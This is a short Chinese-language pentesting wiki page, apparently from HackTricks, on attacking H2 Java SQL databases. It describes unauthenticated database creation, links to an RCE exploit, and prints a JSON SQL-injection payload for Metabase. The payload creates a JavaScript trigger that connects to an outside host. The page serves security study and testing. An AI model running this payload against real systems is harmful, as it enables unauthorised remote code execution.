# H2 - Java SQL数据库

{{#include ../../banners/hacktricks-training.md}}

{% embed url="https://websec.nl/" %}

官方页面: [https://www.h2database.com/html/main.html](https://www.h2database.com/html/main.html)

## 访问

您可以指定一个**不存在的数据库名称**以**在没有有效凭据的情况下创建新数据库**（**未认证**）：

![](<../../images/image (131).png>)

或者如果您知道例如**mysql正在运行**，并且您知道**数据库名称**和该数据库的**凭据**，您可以直接访问它：

![](<../../images/image (201).png>)

_**来自HTB的Hawk盒子的技巧。**_

## **RCE**

访问H2数据库后，请查看此漏洞以获取RCE: [https://gist.github.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed](https://gist.github.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed)

## H2 SQL注入到RCE

在[**这篇文章**](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/)中，解释了一种有效载荷以通过H2数据库获取**RCE**，利用**SQL注入**。
```json
[...]
"details":
{
"db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER IAMPWNED BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\nnew java.net.URL('https://example.com/pwn134').openConnection().getContentLength()\n$$--=x\\;",
"advanced-options": false,
"ssl": true
},
[...]
```
{% embed url="https://websec.nl/" %}

{{#include ../../banners/hacktricks-training.md}}
